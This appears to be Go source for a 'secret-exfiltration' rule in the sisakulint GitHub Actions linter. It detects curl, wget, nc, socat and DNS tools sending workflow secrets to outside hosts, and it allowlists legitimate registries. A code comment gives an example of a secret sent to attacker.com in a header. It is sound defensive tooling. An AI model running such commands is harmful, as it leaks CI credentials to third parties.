package core

import (
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"

	"github.com/sisaku-security/sisakulint/pkg/ast"
	"github.com/sisaku-security/sisakulint/pkg/shell"
)

// SecretExfiltrationRule detects patterns where secrets may be exfiltrated to external services.
// This rule identifies dangerous patterns such as:
// 1. Network commands (curl, wget, nc, etc.) with secrets in arguments
// 2. Secrets passed via environment variables to network commands
// 3. DNS exfiltration via dig/nslookup with secrets
//
// The rule distinguishes between legitimate uses (npm publish, docker login, etc.)
// and potentially malicious patterns.
type SecretExfiltrationRule struct {
	BaseRule
	currentStep *ast.Step
	workflow    *ast.Workflow
}

// networkCommand represents a network-related command that could be used for exfiltration
type networkCommand struct {
	name          string
	dataFlags     []string // Flags that typically carry data (e.g., -d for curl)
	isHighRisk    bool     // True for commands like curl with POST, nc, telnet
	legitPatterns []string // Patterns that indicate legitimate use
}

var networkCommands = []networkCommand{
	{
		name:       "curl",
		dataFlags:  []string{"-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "-F", "--form", "-H", "--header"},
		isHighRisk: true,
		legitPatterns: []string{
			"api.github.com",
			"uploads.github.com",
			"registry.npmjs.org",
			"pypi.org",
			"upload.pypi.org",
			"hub.docker.com",
			"ghcr.io",
			"docker.io",
			"gcr.io",
			"ecr.aws",
			"azurecr.io",
			"nuget.org",
			"api.nuget.org",
			"rubygems.org",
			"packagist.org",
			"crates.io",
			"pkg.go.dev",
			"maven.org",
			"sonatype.org",
			"jfrog.io",
			"slack.com/api",
			"hooks.slack.com",
			"discord.com/api",
			"api.telegram.org",
			"codecov.io",
			"coveralls.io",
			"codeclimate.com",
			"sonarcloud.io",
			"snyk.io",
			"sentry.io",
			"datadoghq.com",
			"newrelic.com",
			"pagerduty.com",
			"opsgenie.com",
			"circleci.com",
			"travis-ci.com",
			"app.terraform.io",
			"hashicorp.com",
		},
	},
	{
		name:       "wget",
		dataFlags:  []string{"--post-data", "--post-file", "--header"},
		isHighRisk: true,
		legitPatterns: []string{
			"github.com",
			"githubusercontent.com",
		},
	},
	{
		name:          "nc",
		dataFlags:     []string{},
		isHighRisk:    true,
		legitPatterns: []string{},
	},
	{
		name:          "netcat",
		dataFlags:     []string{},
		isHighRisk:    true,
		legitPatterns: []string{},
	},
	{
		name:          "ncat",
		dataFlags:     []string{},
		isHighRisk:    true,
		legitPatterns: []string{},
	},
	{
		name:          "telnet",
		dataFlags:     []string{},
		isHighRisk:    true,
		legitPatterns: []string{},
	},
	{
		name:          "socat",
		dataFlags:     []string{},
		isHighRisk:    true,
		legitPatterns: []string{},
	},
	{
		name:       "dig",
		dataFlags:  []string{},
		isHighRisk: true, // DNS exfiltration
		legitPatterns: []string{
			"@8.8.8.8",
			"@1.1.1.1",
			"localhost",
		},
	},
	{
		name:       "nslookup",
		dataFlags:  []string{},
		isHighRisk: true, // DNS exfiltration
		legitPatterns: []string{
			"8.8.8.8",
			"1.1.1.1",
			"localhost",
		},
	},
	{
		name:       "host",
		dataFlags:  []string{},
		isHighRisk: true, // DNS exfiltration
		legitPatterns: []string{
			"8.8.8.8",
			"1.1.1.1",
		},
	},
}

// Patterns for legitimate authentication/publishing commands
var legitimatePatterns = []*regexp.Regexp{
	// Package managers and registries
	regexp.MustCompile(`(?i)npm\s+(publish|login|adduser)`),
	regexp.MustCompile(`(?i)yarn\s+publish`),
	regexp.MustCompile(`(?i)pnpm\s+publish`),
	regexp.MustCompile(`(?i)docker\s+(login|push)`),
	regexp.MustCompile(`(?i)podman\s+(login|push)`),
	regexp.MustCompile(`(?i)pip\s+upload`),
	regexp.MustCompile(`(?i)twine\s+upload`),
	regexp.MustCompile(`(?i)gem\s+push`),
	regexp.MustCompile(`(?i)cargo\s+publish`),
	regexp.MustCompile(`(?i)dotnet\s+nuget\s+push`),
	regexp.MustCompile(`(?i)mvn\s+deploy`),
	regexp.MustCompile(`(?i)gradle\s+publish`),
	regexp.MustCompile(`(?i)go\s+mod\s+publish`),
	regexp.MustCompile(`(?i)composer\s+publish`),

	// Cloud CLI tools (authentication)
	regexp.MustCompile(`(?i)aws\s+(configure|sts|ecr)`),
	regexp.MustCompile(`(?i)gcloud\s+(auth|config)`),
	regexp.MustCompile(`(?i)az\s+(login|acr)`),
	regexp.MustCompile(`(?i)kubectl\s+config`),
	regexp.MustCompile(`(?i)helm\s+(push|repo)`),

	// Git operations
	regexp.MustCompile(`(?i)git\s+(push|clone|fetch|pull|remote)`),
	regexp.MustCompile(`(?i)gh\s+(api|pr|issue|release)`),

	// CI/CD tools
	regexp.MustCompile(`(?i)codecov`),
	regexp.MustCompile(`(?i)coveralls`),

	// Terraform/Infrastructure
	regexp.MustCompile(`(?i)terraform\s+(login|init|apply|plan)`),
	regexp.MustCompile(`(?i)vault\s+(login|kv|read|write)`),
}

// exfiltrationPattern represents a detected exfiltration pattern
type exfiltrationPattern struct {
	command      string
	secretRef    string
	envVarName   string // If secret is passed via env var
	isEnvVarLeak bool   // If secret is in env var passed to command
	position     *ast.Position
	severity     string // "critical" or "high"
}

// NewSecretExfiltrationRule creates a new SecretExfiltrationRule
func NewSecretExfiltrationRule() *SecretExfiltrationRule {
	return &SecretExfiltrationRule{
		BaseRule: BaseRule{
			RuleName: "secret-exfiltration",
			RuleDesc: "Detects patterns where secrets may be exfiltrated to external services via network commands (curl, wget, nc, etc.). " +
				"See https://sisaku-security.github.io/lint/docs/rules/secretexfiltration/",
		},
	}
}

// VisitWorkflowPre captures workflow context
func (rule *SecretExfiltrationRule) VisitWorkflowPre(node *ast.Workflow) error {
	rule.workflow = node
	return nil
}

// VisitJobPre visits each job and checks steps
func (rule *SecretExfiltrationRule) VisitJobPre(node *ast.Job) error {
	for _, step := range node.Steps {
		rule.currentStep = step
		rule.checkStep(step)
	}
	return nil
}

// checkStep checks a single step for secret exfiltration patterns
func (rule *SecretExfiltrationRule) checkStep(step *ast.Step) {
	if step.Exec == nil {
		return
	}

	// Only check run: scripts
	execRun, ok := step.Exec.(*ast.ExecRun)
	if !ok || execRun.Run == nil {
		return
	}

	script := execRun.Run.Value
	if script == "" {
		return
	}

	// Collect step environment variables
	stepEnvSecrets := rule.collectEnvSecrets(step.Env)

	// Check for exfiltration patterns
	patterns := rule.detectExfiltrationPatterns(script, execRun.Run, stepEnvSecrets)

	for _, pattern := range patterns {
		rule.reportExfiltration(pattern)
	}
}

// collectEnvSecrets collects environment variables that contain secrets
func (rule *SecretExfiltrationRule) collectEnvSecrets(env *ast.Env) map[string]string {
	result := make(map[string]string)
	if env == nil || env.Vars == nil {
		return result
	}

	for key, envVar := range env.Vars {
		if envVar.Value != nil && strings.Contains(envVar.Value.Value, "secrets.") {
			// Extract the secret reference
			secretRef := rule.extractSecretRef(envVar.Value.Value)
			if secretRef != "" {
				// Use the actual env var name from the Name field if available
				envName := key
				if envVar.Name != nil {
					envName = envVar.Name.Value
				}
				result[envName] = secretRef
			}
		}
	}

	return result
}

// extractSecretRef extracts secret reference from a string like "${{ secrets.TOKEN }}"
func (rule *SecretExfiltrationRule) extractSecretRef(value string) string {
	re := regexp.MustCompile(`\$\{\{\s*secrets\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}`)
	matches := re.FindStringSubmatch(value)
	if len(matches) > 1 {
		return "secrets." + matches[1]
	}
	return ""
}

// isLegitimateUse checks if the script contains legitimate authentication/publishing patterns
func (rule *SecretExfiltrationRule) isLegitimateUse(script string) bool {
	for _, pattern := range legitimatePatterns {
		if pattern.MatchString(script) {
			return true
		}
	}
	return false
}

// buildLogicalCommand joins a line and its continuation lines into a single logical
// command string. It handles two kinds of continuations:
//  1. Shell line-continuation: lines ending with '\'
//  2. Open single-quoted strings: a line that contains an unmatched ' keeps
//     collecting subsequent lines until the quote is closed.
//
// This ensures that multi-line curl commands such as:
//
//	curl -H "Auth: $TOKEN" \
//	  -d '{
//	    "key": "val"
//	  }' "https://api.github.com/..."
//
// are fully collected so that the legit-pattern check sees the URL.
func buildLogicalCommand(lines []string, startIdx int) string {
	var parts []string
	inSingleQuote := false
	for i := startIdx; i < len(lines); i++ {
		line := lines[i]
		parts = append(parts, line)

		// Count unescaped single quotes to track whether we are inside a
		// single-quoted string at the end of this line.
		for j := 0; j < len(line); j++ {
			if line[j] == '\'' {
				inSingleQuote = !inSingleQuote
			}
		}

		if inSingleQuote {
			// Still inside a single-quoted literal; keep collecting lines.
			continue
		}

		// Outside a quoted string: stop unless there is a line continuation.
		trimmed := strings.TrimRight(line, " \t")
		if !strings.HasSuffix(trimmed, "\\") {
			break
		}
	}
	return strings.Join(parts, " ")
}

// resolveVarInScript looks up shell variable assignments within script and returns the
// assigned value for varName, or "" if not found.
// When the variable is assigned multiple times, the last assignment is returned to match
// shell semantics where later assignments overwrite earlier ones. This prevents a bypass
// where an attacker shadows a legitimate assignment with a malicious one.
func resolveVarInScript(script, varName string) string {
	return resolveVarInScriptBefore(script, varName, len(script))
}

func resolveVarInScriptBefore(script, varName string, maxOffset int) string {
	if maxOffset < 0 {
		return ""
	}
	if maxOffset > len(script) {
		maxOffset = len(script)
	}

	// Single regex matching all three quote styles: VAR="value", VAR='value', VAR=value
	// Group 1: double-quoted value, Group 2: single-quoted value, Group 3: unquoted value
	pattern := `(?m)^\s*` + regexp.QuoteMeta(varName) + `=(?:"([^"]+)"|'([^']+)'|(\S+))`
	re := regexp.MustCompile(pattern)
	all := re.FindAllStringSubmatchIndex(script, -1)

	var last []int
	for _, match := range all {
		if len(match) < 8 || match[1] > maxOffset {
			continue
		}
		last = match
	}
	if last == nil {
		return ""
	}

	// Take the last assignment to match shell semantics.
	for groupIdx := 2; groupIdx < len(last); groupIdx += 2 {
		if last[groupIdx] >= 0 && last[groupIdx+1] >= 0 {
			return script[last[groupIdx]:last[groupIdx+1]]
		}
	}
	return ""
}

// matchesLegitPatternWithVarResolution checks whether the curl/wget line matches a legit
// destination pattern, resolving any shell variable references in the URL argument against
// earlier assignments in the full script block.
func (rule *SecretExfiltrationRule) matchesLegitPatternWithVarResolution(line, script string, cmd networkCommand) bool {
	// First: direct check on the logical command (already joined continuations).
	if rule.matchesLegitPattern(line, cmd) {
		return true
	}
	// Second: resolve $VAR / ${VAR} references on the line and check those values.
	varRe := regexp.MustCompile(`\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?`)
	varMatches := varRe.FindAllStringSubmatch(line, -1)
	for _, vm := range varMatches {
		if len(vm) < 2 {
			continue
		}
		varName := vm[1]
		value := resolveVarInScript(script, varName)
		if value == "" {
			continue
		}
		// Build an augmented line where the variable reference is replaced with
		// its resolved value, then re-check legit patterns.
		augmented := strings.ReplaceAll(line, vm[0], value)
		if rule.matchesLegitPattern(augmented, cmd) {
			return true
		}
	}
	return false
}

// detectExfiltrationPatterns analyzes the script for exfiltration patterns.
func (rule *SecretExfiltrationRule) detectExfiltrationPatterns(script string, runStr *ast.String, envSecrets map[string]string) []exfiltrationPattern {
	parsedScript, secretPlaceholders := shellScriptForNetworkParsing(script)
	parser := shell.NewShellParser(parsedScript)
	calls := parser.FindNetworkCommands()
	if len(calls) == 0 {
		return nil
	}

	var patterns []exfiltrationPattern
	for _, call := range calls {
		cmd, ok := networkCommandByName(call.CommandName)
		if !ok {
			continue
		}
		if rule.networkCallMatchesAllowlist(call, script, cmd) {
			continue
		}
		patterns = append(patterns, rule.analyzeNetworkCommandCall(call, runStr, envSecrets, cmd, secretPlaceholders)...)
	}
	return patterns
}

func shellScriptForNetworkParsing(script string) (string, map[string]string) {
	re := regexp.MustCompile(`\$\{\{\s*([^}]*)\s*\}\}`)
	secretPlaceholders := map[string]string{}
	secretIdx := 0

	normalized := re.ReplaceAllStringFunc(script, func(match string) string {
		submatches := re.FindStringSubmatch(match)
		if len(submatches) < 2 {
			return strings.Repeat("_", len(match))
		}

		expr := strings.TrimSpace(submatches[1])
		if strings.HasPrefix(expr, "secrets.") {
			secretName := strings.TrimPrefix(expr, "secrets.")
			if regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*$`).MatchString(secretName) {
				token := "__slgha" + strconv.FormatInt(int64(secretIdx), 36) + "__"
				secretIdx++
				if len(token) > len(match) {
					token = "__" + strconv.FormatInt(int64(secretIdx), 36) + "__"
				}
				if len(token) > len(match) {
					return strings.Repeat("_", len(match))
				}
				token += strings.Repeat("_", len(match)-len(token))
				secretPlaceholders[token] = "secrets." + secretName
				return token
			}
		}
		return strings.Repeat("_", len(match))
	})
	return normalized, secretPlaceholders
}

func networkCommandByName(name string) (networkCommand, bool) {
	for _, cmd := range networkCommands {
		if cmd.name == name {
			return cmd, true
		}
	}
	return networkCommand{}, false
}

func (rule *SecretExfiltrationRule) analyzeNetworkCommandCall(call shell.NetworkCommandCall, runStr *ast.String, envSecrets map[string]string, cmd networkCommand, secretPlaceholders map[string]string) []exfiltrationPattern {
	var patterns []exfiltrationPattern

	for idx, arg := range call.Args {
		if !rule.isDataSinkArg(call, idx, cmd) {
			continue
		}

		for _, secretRef := range secretRefsFromCommandArgWithPlaceholders(arg, secretPlaceholders) {
			patterns = append(patterns, exfiltrationPattern{
				command:   cmd.name,
				secretRef: secretRef,
				position:  positionFromCommandArg(runStr, arg),
				severity:  rule.severityForCallArg(call, idx, cmd),
			})
		}

		for _, envLeak := range rule.envSecretRefsFromCommandArg(arg, envSecrets) {
			patterns = append(patterns, exfiltrationPattern{
				command:      cmd.name,
				secretRef:    envLeak.secretRef,
				envVarName:   envLeak.envName,
				isEnvVarLeak: true,
				position:     positionFromCommandArg(runStr, arg),
				severity:     rule.severityForCallArg(call, idx, cmd),
			})
		}
	}

	if call.InPipe && len(cmd.dataFlags) == 0 {
		for _, pipeArg := range call.PipeInputs {
			for _, secretRef := range secretRefsFromCommandArgWithPlaceholders(pipeArg, secretPlaceholders) {
				patterns = append(patterns, exfiltrationPattern{
					command:   cmd.name,
					secretRef: secretRef,
					position:  positionFromCommandArg(runStr, pipeArg),
					severity:  "high",
				})
			}
			for _, envLeak := range rule.envSecretRefsFromCommandArg(pipeArg, envSecrets) {
				patterns = append(patterns, exfiltrationPattern{
					command:      cmd.name,
					secretRef:    envLeak.secretRef,
					envVarName:   envLeak.envName,
					isEnvVarLeak: true,
					position:     positionFromCommandArg(runStr, pipeArg),
					severity:     "high",
				})
			}
		}
	}

	return patterns
}

type envSecretLeak struct {
	envName   string
	secretRef string
}

func (rule *SecretExfiltrationRule) envSecretRefsFromCommandArg(arg shell.CommandArg, envSecrets map[string]string) []envSecretLeak {
	if len(envSecrets) == 0 || len(arg.VarNames) == 0 {
		return nil
	}

	leaks := make([]envSecretLeak, 0, len(arg.VarNames))
	seen := map[string]bool{}
	for _, varName := range arg.VarNames {
		secretRef, ok := envSecrets[varName]
		if !ok || seen[varName] {
			continue
		}
		seen[varName] = true
		leaks = append(leaks, envSecretLeak{
			envName:   varName,
			secretRef: secretRef,
		})
	}
	return leaks
}

func secretRefsFromCommandArg(arg shell.CommandArg) []string {
	return secretRefsFromCommandArgWithPlaceholders(arg, nil)
}

func secretRefsFromCommandArgWithPlaceholders(arg shell.CommandArg, secretPlaceholders map[string]string) []string {
	refs := make([]string, 0, len(arg.GHAExprs))
	seen := map[string]bool{}

	for _, expr := range arg.GHAExprs {
		expr = strings.TrimSpace(expr)
		if !strings.HasPrefix(expr, "secrets.") {
			continue
		}
		if !seen[expr] {
			seen[expr] = true
			refs = append(refs, expr)
		}
	}

	if len(refs) > 0 {
		return refs
	}

	for placeholder, secretRef := range secretPlaceholders {
		if strings.Contains(arg.Value, placeholder) || strings.Contains(arg.LiteralValue, placeholder) {
			if !seen[secretRef] {
				seen[secretRef] = true
				refs = append(refs, secretRef)
			}
		}
	}
	if len(refs) > 0 {
		return refs
	}

	re := regexp.MustCompile(`\$\{\{\s*(secrets\.[A-Za-z_][A-Za-z0-9_]*)\s*\}\}`)
	matches := re.FindAllStringSubmatch(arg.Value, -1)
	for _, match := range matches {
		if len(match) > 1 && !seen[match[1]] {
			seen[match[1]] = true
			refs = append(refs, match[1])
		}
	}
	return refs
}

func (rule *SecretExfiltrationRule) isDataSinkArg(call shell.NetworkCommandCall, argIdx int, cmd networkCommand) bool {
	if argIdx < 0 || argIdx >= len(call.Args) {
		return false
	}
	arg := call.Args[argIdx]

	if len(cmd.dataFlags) == 0 {
		return true
	}

	if rule.argIsInlineDataFlag(arg, cmd) {
		return true
	}

	if argIdx > 0 && rule.argConsumesPreviousDataFlag(call.Args[argIdx-1], cmd) {
		return true
	}

	return false
}

func (rule *SecretExfiltrationRule) argConsumesPreviousDataFlag(previous shell.CommandArg, cmd networkCommand) bool {
	if !previous.IsFlag {
		return false
	}
	flag := flagName(previous)
	if flagHasInlineValue(previous) {
		return false
	}
	return stringInSlice(flag, cmd.dataFlags)
}

func (rule *SecretExfiltrationRule) argIsInlineDataFlag(arg shell.CommandArg, cmd networkCommand) bool {
	if !arg.IsFlag || !flagHasInlineValue(arg) {
		return false
	}
	return stringInSlice(flagName(arg), cmd.dataFlags)
}

func flagName(arg shell.CommandArg) string {
	value := arg.LiteralValue
	if value == "" {
		value = arg.Value
	}
	if flag, ok := attachedShortFlagName(value); ok {
		return flag
	}
	if idx := strings.Index(value, "="); idx >= 0 {
		return value[:idx]
	}
	return value
}

func flagHasInlineValue(arg shell.CommandArg) bool {
	value := arg.LiteralValue
	if value == "" {
		value = arg.Value
	}
	if strings.Contains(value, "=") {
		return true
	}
	_, ok := attachedShortFlagName(value)
	return ok
}

func attachedShortFlagName(value string) (string, bool) {
	if len(value) <= 2 || !strings.HasPrefix(value, "-") || strings.HasPrefix(value, "--") {
		return "", false
	}

	flag := value[:2]
	if !knownAttachedShortValueFlag(flag) {
		return "", false
	}
	return flag, true
}

func knownAttachedShortValueFlag(flag string) bool {
	switch flag {
	case "-A", "-b", "-c", "-d", "-e", "-F", "-H", "-K", "-o", "-O", "-u", "-w", "-X":
		return true
	default:
		return false
	}
}

func stringInSlice(value string, values []string) bool {
	for _, candidate := range values {
		if candidate == value {
			return true
		}
	}
	return false
}

func (rule *SecretExfiltrationRule) severityForCallArg(call shell.NetworkCommandCall, argIdx int, cmd networkCommand) string {
	if cmd.isHighRisk && len(cmd.dataFlags) > 0 && rule.isDataSinkArg(call, argIdx, cmd) {
		return "critical"
	}
	return "high"
}

func positionFromCommandArg(runStr *ast.String, arg shell.CommandArg) *ast.Position {
	line := int(arg.Position.Line()) //nolint:gosec // workflow line numbers fit in int
	col := int(arg.Position.Col())   //nolint:gosec // workflow columns fit in int

	if runStr != nil && runStr.Pos != nil {
		line += runStr.Pos.Line - 1
	}
	if runStr != nil && runStr.Literal {
		line++
	}
	if line <= 0 {
		line = 1
	}
	if col <= 0 {
		col = 1
	}

	return &ast.Position{Line: line, Col: col}
}

func (rule *SecretExfiltrationRule) networkCallMatchesAllowlist(call shell.NetworkCommandCall, script string, cmd networkCommand) bool {
	if len(cmd.legitPatterns) == 0 {
		return false
	}

	maxOffset := int(call.Position.Offset()) //nolint:gosec // workflow shell script offsets fit in int
	destinationArgs := rule.destinationArgsForCall(call, cmd)
	if len(destinationArgs) == 0 {
		return false
	}
	for _, arg := range destinationArgs {
		if !rule.argMatchesLegitPattern(arg, script, cmd, maxOffset) {
			return false
		}
	}
	return true
}

func (rule *SecretExfiltrationRule) argMatchesLegitPattern(arg shell.CommandArg, script string, cmd networkCommand, maxOffset int) bool {
	values := []string{arg.Value, arg.LiteralValue}
	for _, varName := range arg.VarNames {
		if resolved := resolveVarInScriptBefore(script, varName, maxOffset); resolved != "" {
			values = append(values, resolved)
			values = append(values, strings.ReplaceAll(arg.Value, "$"+varName, resolved))
			values = append(values, strings.ReplaceAll(arg.Value, "${"+varName+"}", resolved))
			values = append(values, strings.ReplaceAll(arg.LiteralValue, "$"+varName, resolved))
			values = append(values, strings.ReplaceAll(arg.LiteralValue, "${"+varName+"}", resolved))
		}
	}

	for _, value := range values {
		if rule.destinationMatchesLegitPattern(value, cmd) {
			return true
		}
	}
	return false
}

func (rule *SecretExfiltrationRule) destinationArgsForCall(call shell.NetworkCommandCall, cmd networkCommand) []shell.CommandArg {
	switch cmd.name {
	case "curl":
		return destinationArgsForURLCommand(call.Args, curlFlagsConsumingNextArg(), []string{"--url"})
	case "wget":
		return destinationArgsForURLCommand(call.Args, wgetFlagsConsumingNextArg(), nil)
	default:
		return destinationArgsForDNSCommand(call.Args)
	}
}

func destinationArgsForURLCommand(args []shell.CommandArg, consumingFlags map[string]bool, destinationFlags []string) []shell.CommandArg {
	var destinations []shell.CommandArg
	for idx := 0; idx < len(args); idx++ {
		arg := args[idx]
		if arg.IsFlag {
			flag := flagName(arg)
			if stringInSlice(flag, destinationFlags) {
				if flagHasInlineValue(arg) {
					destinations = append(destinations, arg)
				} else if idx+1 < len(args) {
					idx++
					destinations = append(destinations, args[idx])
				}
				continue
			}
			if consumingFlags[flag] && !flagHasInlineValue(arg) {
				idx++
			}
			continue
		}
		if isURLishCommandArg(arg) {
			destinations = append(destinations, arg)
		}
	}
	return destinations
}

func destinationArgsForDNSCommand(args []shell.CommandArg) []shell.CommandArg {
	var destinations []shell.CommandArg
	for _, arg := range args {
		if arg.IsFlag {
			continue
		}
		destinations = append(destinations, arg)
	}
	return destinations
}

func curlFlagsConsumingNextArg() map[string]bool {
	return map[string]bool{
		"-A": true, "--user-agent": true,
		"-b": true, "--cookie": true,
		"-c": true, "--cookie-jar": true,
		"-d": true, "--data": true, "--data-ascii": true, "--data-binary": true, "--data-raw": true, "--data-urlencode": true,
		"-e": true, "--referer": true,
		"-F": true, "--form": true, "--form-string": true,
		"-H": true, "--header": true,
		"-K": true, "--config": true,
		"-o": true, "--output": true,
		"-u": true, "--user": true,
		"-w": true, "--write-out": true,
		"-X": true, "--request": true,
		"--cacert": true, "--cert": true, "--connect-to": true, "--key": true, "--proxy": true, "--resolve": true,
	}
}

func wgetFlagsConsumingNextArg() map[string]bool {
	return map[string]bool{
		"-O": true, "--output-document": true,
		"-o": true, "--output-file": true,
		"--body-data": true, "--body-file": true,
		"--header":        true,
		"--http-password": true, "--http-user": true,
		"--post-data": true, "--post-file": true,
		"--referer": true,
		"--user":    true, "--user-agent": true,
		"--password": true,
	}
}

func isURLishCommandArg(arg shell.CommandArg) bool {
	value := commandArgComparableValue(arg)
	value = strings.Trim(value, `"'`)
	return strings.HasPrefix(value, "http://") ||
		strings.HasPrefix(value, "https://") ||
		strings.HasPrefix(value, "$") ||
		strings.HasPrefix(value, "${")
}

func (rule *SecretExfiltrationRule) destinationMatchesLegitPattern(value string, cmd networkCommand) bool {
	for _, pattern := range cmd.legitPatterns {
		if legitPatternMatchesDestination(value, pattern) {
			return true
		}
	}
	return false
}

func legitPatternMatchesDestination(value, pattern string) bool {
	value = strings.ToLower(strings.TrimSpace(strings.Trim(value, `"'`)))
	pattern = strings.ToLower(strings.TrimSpace(pattern))
	if value == "" || pattern == "" {
		return false
	}

	host, path := destinationHostAndPath(value)
	patternHost, patternPath := splitLegitPattern(pattern)
	if host == "" || patternHost == "" {
		return value == pattern
	}
	if !hostMatchesPattern(host, patternHost) {
		return false
	}
	return patternPath == "" || strings.HasPrefix(path, patternPath)
}

func splitLegitPattern(pattern string) (string, string) {
	value := strings.TrimSpace(strings.Trim(pattern, `"'`))
	if strings.Contains(value, "://") {
		return destinationHostAndPath(value)
	}
	if strings.HasPrefix(value, "@") {
		return value, ""
	}
	if slashIdx := strings.Index(value, "/"); slashIdx >= 0 {
		return value[:slashIdx], value[slashIdx:]
	}
	return value, ""
}

func destinationHostAndPath(value string) (string, string) {
	value = strings.TrimSpace(strings.Trim(value, `"'`))
	if value == "" {
		return "", ""
	}
	if strings.HasPrefix(value, "@") {
		return value, ""
	}

	parseValue := value
	if !strings.Contains(parseValue, "://") {
		parseValue = "//" + parseValue
	}
	parsed, err := url.Parse(parseValue)
	if err == nil && parsed.Hostname() != "" {
		return parsed.Hostname(), parsed.EscapedPath()
	}

	host := value
	if slashIdx := strings.Index(host, "/"); slashIdx >= 0 {
		host = host[:slashIdx]
	}
	if colonIdx := strings.LastIndex(host, ":"); colonIdx > strings.LastIndex(host, "]") {
		host = host[:colonIdx]
	}
	return strings.Trim(host, "[]"), ""
}

func hostMatchesPattern(host, pattern string) bool {
	host = strings.TrimSuffix(strings.TrimPrefix(strings.ToLower(host), "@"), ".")
	pattern = strings.TrimSuffix(strings.TrimPrefix(strings.ToLower(pattern), "@"), ".")
	if host == "" || pattern == "" {
		return false
	}
	return host == pattern || strings.HasSuffix(host, "."+pattern)
}

func commandArgComparableValue(arg shell.CommandArg) string {
	if arg.LiteralValue != "" {
		return arg.LiteralValue
	}
	return arg.Value
}

// isSecretAsUrlArg returns true when the secret reference appears to be the
// URL positional argument of a curl/wget command rather than the value of a
// data/header flag.
//
// Example of a URL positional arg (should NOT flag):
//
//	curl -d "$PAYLOAD" ${{ secrets.DISCORD_WEBHOOK_URL }}
//
// Example of a flag value (SHOULD flag):
//
//	curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" attacker.com
func (rule *SecretExfiltrationRule) isSecretAsUrlArg(line string, secretRef string, cmd networkCommand) bool {
	if len(cmd.dataFlags) == 0 {
		// Commands without data flags (nc, telnet, dig, etc.) don't have a
		// distinct URL positional arg concept – always treat as exfiltration.
		return false
	}

	secretIdx := strings.Index(line, secretRef)
	if secretIdx == -1 {
		return false
	}

	// The command must appear before the secret reference in the line.
	cmdIdx := strings.Index(line, cmd.name)
	if cmdIdx == -1 || cmdIdx >= secretIdx {
		return false
	}

	// Examine the substring between the command occurrence and the secret.
	between := line[cmdIdx+len(cmd.name) : secretIdx]

	// Check whether any data flag's value is still open (unclosed quote) at
	// the point where the secret appears.  If yes, the secret is inside a
	// flag value and is being exfiltrated.
	for _, flag := range cmd.dataFlags {
		flagIdx := strings.LastIndex(between, flag)
		if flagIdx == -1 {
			continue
		}
		afterFlag := strings.TrimLeft(between[flagIdx+len(flag):], " \t=")
		if afterFlag == "" {
			// Flag appears immediately before the secret (unquoted flag value).
			return false
		}
		if strings.HasPrefix(afterFlag, `"`) {
			if !strings.Contains(afterFlag[1:], `"`) {
				// Opening quote with no closing quote: secret is inside the flag value.
				return false
			}
		} else if strings.HasPrefix(afterFlag, `'`) {
			if !strings.Contains(afterFlag[1:], `'`) {
				return false
			}
		}
		// Otherwise the flag's value is fully closed; the secret is a
		// separate (positional) argument.
	}

	return true // Secret appears to be the URL positional argument.
}

// analyzeLine analyzes a single line for exfiltration patterns
func (rule *SecretExfiltrationRule) analyzeLine(line string, logicalCmd string, script string, runStr *ast.String, lineIdx, lineOffset int, envSecrets map[string]string) []exfiltrationPattern {
	var patterns []exfiltrationPattern

	// Skip comment lines
	trimmedLine := strings.TrimSpace(line)
	if strings.HasPrefix(trimmedLine, "#") {
		return patterns
	}

	// Check each network command
	for _, cmd := range networkCommands {
		if !rule.lineContainsCommand(line, cmd.name) {
			continue
		}

		// Skip if the logical command (including shell line continuations)
		// matches a known-legitimate destination for this command.
		// Also resolve shell variable references within the full script block
		// to handle cases like: api_url="https://api.github.com/..." followed by
		// curl -H "..." "$api_url/endpoint"
		if rule.matchesLegitPatternWithVarResolution(logicalCmd, script, cmd) {
			continue
		}

		// Check for direct secret references in the line
		// Only detect if both the command and secret are on the same line
		secretRefs := rule.findSecretRefsInLine(line)
		for _, secretRef := range secretRefs {
			// Skip secrets that appear to be the URL positional argument
			// (not a data/header flag value).  Using a secret as the curl URL
			// is a different threat model and is not "secret exfiltration".
			if rule.isSecretAsUrlArg(line, secretRef, cmd) {
				continue
			}

			pos := rule.calculatePosition(runStr, lineIdx, lineOffset, line, secretRef)
			severity := "high"
			if cmd.isHighRisk && rule.hasDataFlag(line, cmd) {
				severity = "critical"
			}

			patterns = append(patterns, exfiltrationPattern{
				command:   cmd.name,
				secretRef: secretRef,
				position:  pos,
				severity:  severity,
			})
		}

		// Check for environment variable usage that contains secrets.
		// Only flag if the env var is used in a data-sending context (after a data flag),
		// not when it is used as the URL destination argument (e.g. webhook URL).
		for envName, secretRef := range envSecrets {
			if rule.lineUsesEnvVar(line, envName) && !rule.isEnvVarUsedAsURL(line, envName, cmd) {
				pos := rule.calculatePosition(runStr, lineIdx, lineOffset, line, "$"+envName)
				severity := "high"
				if cmd.isHighRisk && rule.hasDataFlag(line, cmd) {
					severity = "critical"
				}

				patterns = append(patterns, exfiltrationPattern{
					command:      cmd.name,
					secretRef:    secretRef,
					envVarName:   envName,
					isEnvVarLeak: true,
					position:     pos,
					severity:     severity,
				})
			}
		}
	}

	return patterns
}

// lineContainsCommand checks if a line contains a network command
func (rule *SecretExfiltrationRule) lineContainsCommand(line, cmdName string) bool {
	// Match command at start of line or after common shell constructs
	patterns := []string{
		`(?:^|\s|;|&&|\|\||` + "`" + `|\$\()` + regexp.QuoteMeta(cmdName) + `(?:\s|$)`,
	}

	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		if re.MatchString(line) {
			return true
		}
	}
	return false
}

// matchesLegitPattern checks if a line matches legitimate patterns for a command
func (rule *SecretExfiltrationRule) matchesLegitPattern(line string, cmd networkCommand) bool {
	lineLower := strings.ToLower(line)
	for _, pattern := range cmd.legitPatterns {
		if strings.Contains(lineLower, strings.ToLower(pattern)) {
			return true
		}
	}
	return false
}

// findSecretRefsInLine finds all secret references in a line
func (rule *SecretExfiltrationRule) findSecretRefsInLine(line string) []string {
	var refs []string
	re := regexp.MustCompile(`\$\{\{\s*(secrets\.[A-Za-z_][A-Za-z0-9_]*)\s*\}\}`)
	matches := re.FindAllStringSubmatch(line, -1)
	for _, match := range matches {
		if len(match) > 1 {
			refs = append(refs, match[1])
		}
	}
	return refs
}

// hasDataFlag checks if the line contains data-sending flags
